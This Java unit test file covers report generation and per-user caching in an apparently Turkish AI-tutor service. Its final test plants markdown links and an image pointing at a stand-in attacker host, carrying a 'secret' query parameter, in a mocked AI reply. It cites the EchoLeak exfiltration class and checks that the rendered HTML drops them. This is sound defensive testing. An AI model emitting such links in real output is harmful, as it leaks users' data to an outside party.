package tr.velzon.aiogretmen.service;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.mockito.ArgumentCaptor;
import tr.velzon.aiogretmen.ai.OgretmenAiClient;
import tr.velzon.aiogretmen.ai.OgretmenAiClient.AiIstek;
import tr.velzon.aiogretmen.ai.OgretmenAiClient.AiYanit;
import tr.velzon.aiogretmen.ai.PromptFactory;
import tr.velzon.aiogretmen.config.AppProperties;
import tr.velzon.aiogretmen.repo.ContentRepo;
import tr.velzon.aiogretmen.repo.GonderimRepo;
import tr.velzon.aiogretmen.repo.IlerlemeRepo;
import tr.velzon.aiogretmen.repo.QuizSonucRepo;
import tr.velzon.aiogretmen.repo.SohbetRepo;
import tr.velzon.aiogretmen.types.Gonderim;
import tr.velzon.aiogretmen.types.QuizSonucKaydi;
import tr.velzon.aiogretmen.types.SohbetMesaji;

import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Instant;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyInt;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.times;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

class RaporServiceTest {

    @TempDir
    Path tempDir;

    OgretmenAiClient aiClient = mock(OgretmenAiClient.class);
    BaglamServisi baglamServisi = mock(BaglamServisi.class);
    IlerlemeRepo ilerlemeRepo = mock(IlerlemeRepo.class);
    QuizSonucRepo quizSonucRepo = mock(QuizSonucRepo.class);
    GonderimRepo gonderimRepo = mock(GonderimRepo.class);
    SohbetRepo sohbetRepo = mock(SohbetRepo.class);
    RaporService servis;
    String aktif = "yerel";

    @BeforeEach
    void kur() {
        AppProperties props = new AppProperties("src/test/resources/test-content", "prompts",
                null, tempDir.resolve("raporlar").toString(), null, null, null);
        servis = new RaporService(props, aiClient, baglamServisi,
                new PromptFactory(Path.of("prompts")),
                new ContentRepo(Path.of("src/test/resources/test-content")),
                ilerlemeRepo, quizSonucRepo, gonderimRepo, sohbetRepo, () -> aktif);

        when(baglamServisi.sistemBaglami(anyInt(), any())).thenReturn("SISTEM");
        when(ilerlemeRepo.findByKullaniciIdAndHafta(anyString(), anyInt())).thenReturn(List.of());
        when(quizSonucRepo.findByKullaniciIdAndHaftaOrderByTarihDesc(anyString(), anyInt())).thenReturn(List.of(
                new QuizSonucKaydi(1L, "yerel", 1, "STATIK", 80, null, Instant.now())));
        when(gonderimRepo.findByKullaniciIdAndHaftaOrderByTarihDesc(anyString(), anyInt())).thenReturn(List.of(
                new Gonderim(1L, "yerel", 1, 1, "OZET", "özet içeriği", "{\"puan\":65}", 65, Instant.now())));
        when(sohbetRepo.findByKullaniciIdAndHaftaOrderByTarihAsc(anyString(), anyInt())).thenReturn(List.of(
                new SohbetMesaji(1L, "yerel", 1, "USER", "harness nedir", Instant.now())));
        when(aiClient.cagir(any())).thenReturn(new AiYanit("# Hafta 1 Raporu\n## Güçlü yönler\n- iyi", 100, 200, "m"));
    }

    @Test
    void raporUretirVeHaftaninVerisiniPromptaKoyar() {
        var rapor = servis.rapor(1, false);

        assertThat(rapor.cacheden()).isFalse();
        assertThat(rapor.markdown()).contains("# Hafta 1 Raporu");
        assertThat(rapor.html()).contains("<h1>");

        ArgumentCaptor<AiIstek> istek = ArgumentCaptor.forClass(AiIstek.class);
        verify(aiClient).cagir(istek.capture());
        String prompt = istek.getValue().kullaniciMesaji();
        assertThat(prompt).contains("STATIK: %80");        // quiz özeti
        assertThat(prompt).contains("özet içeriği");       // gönderim
        assertThat(prompt).contains("harness nedir");      // sohbet özeti
        assertThat(prompt).contains("Gün 1");              // görev özeti
    }

    @Test
    void ikinciCagriCachedenDoner_aiCagrilmaz() {
        servis.rapor(1, false);
        var ikinci = servis.rapor(1, false);

        assertThat(ikinci.cacheden()).isTrue();
        verify(aiClient, times(1)).cagir(any()); // sadece ilk üretim
    }

    @Test
    void yenileCacheiAtlarVeYenidenUretir() {
        servis.rapor(1, false);
        var yenilenen = servis.rapor(1, true);

        assertThat(yenilenen.cacheden()).isFalse();
        verify(aiClient, times(2)).cagir(any());
    }

    // ---------- Faz 9b: kullanıcı başına rapor önbelleği ----------

    @Test
    void yerelRaporEskiYoldaOnbelleklenir() {
        servis.rapor(1, false);
        assertThat(tempDir.resolve("raporlar/hafta-01.md")).exists();
        assertThat(tempDir.resolve("raporlar/kullanicilar")).doesNotExist();
    }

    @Test
    void birKullanicininRaporuDigerineOnbellektenGitmez() {
        aktif = "a@pera.software";
        when(aiClient.cagir(any())).thenReturn(new AiYanit("# A RAPORU", 1, 1, "m"));
        assertThat(servis.rapor(1, false).markdown()).contains("A RAPORU");

        aktif = "b@pera.software";
        when(aiClient.cagir(any())).thenReturn(new AiYanit("# B RAPORU", 1, 1, "m"));
        var b = servis.rapor(1, false);
        assertThat(b.cacheden()).isFalse();
        assertThat(b.markdown()).contains("B RAPORU").doesNotContain("A RAPORU");

        aktif = "a@pera.software";
        var a = servis.rapor(1, false);
        assertThat(a.cacheden()).isTrue();
        assertThat(a.markdown()).contains("A RAPORU");
        assertThat(tempDir.resolve("raporlar/hafta-01.md")).doesNotExist(); // yerel kova kirlenmedi
    }

    @Test
    void onbellekSilmeYalnizVerilenKullaniciyiEtkiler() throws Exception {
        Files.createDirectories(tempDir.resolve("raporlar"));
        Files.writeString(tempDir.resolve("raporlar/hafta-02.md"), "yerel rapor");
        aktif = "a@pera.software";
        servis.rapor(1, false);
        aktif = "b@pera.software";
        servis.rapor(1, false);

        servis.raporOnbeleginiSil("b@pera.software");
        assertThat(KisiselDizin.coz(tempDir.resolve("raporlar"), "b@pera.software")).doesNotExist();
        assertThat(KisiselDizin.coz(tempDir.resolve("raporlar"), "a@pera.software").resolve("hafta-01.md")).exists();
        assertThat(tempDir.resolve("raporlar/hafta-02.md")).exists();

        servis.raporOnbeleginiSil("yerel");
        assertThat(tempDir.resolve("raporlar/hafta-02.md")).doesNotExist();
        assertThat(KisiselDizin.coz(tempDir.resolve("raporlar"), "a@pera.software").resolve("hafta-01.md")).exists();
    }

    @Test
    void raporHtmlindeBaglantiVeGorselYokMetinKalir() {
        // EchoLeak sınıfı (llm-uygulama-guvenligi.md §4d): AI çıktısına sızmış bağlantı/görsel tek tıkla
        // (veya CSP gevşerse tıklamasız) veri dışarı taşır → rapor HTML'inde <a>/<img> HİÇ olmamalı, metin kalmalı
        when(aiClient.cagir(any())).thenReturn(new AiYanit(
                "# Rapor\n[detaylar](https://saldirgan.example/?q=GIZLI) ve "
                        + "![iz](https://saldirgan.example/p.png?d=GIZLI) <https://saldirgan.example/oto>",
                100, 200, "m"));

        String html = servis.rapor(1, true).html();

        assertThat(html).doesNotContain("<a").doesNotContain("<img").doesNotContain("saldirgan.example/?q");
        assertThat(html).contains("detaylar");                 // bağlantı METNİ korunur
    }
}
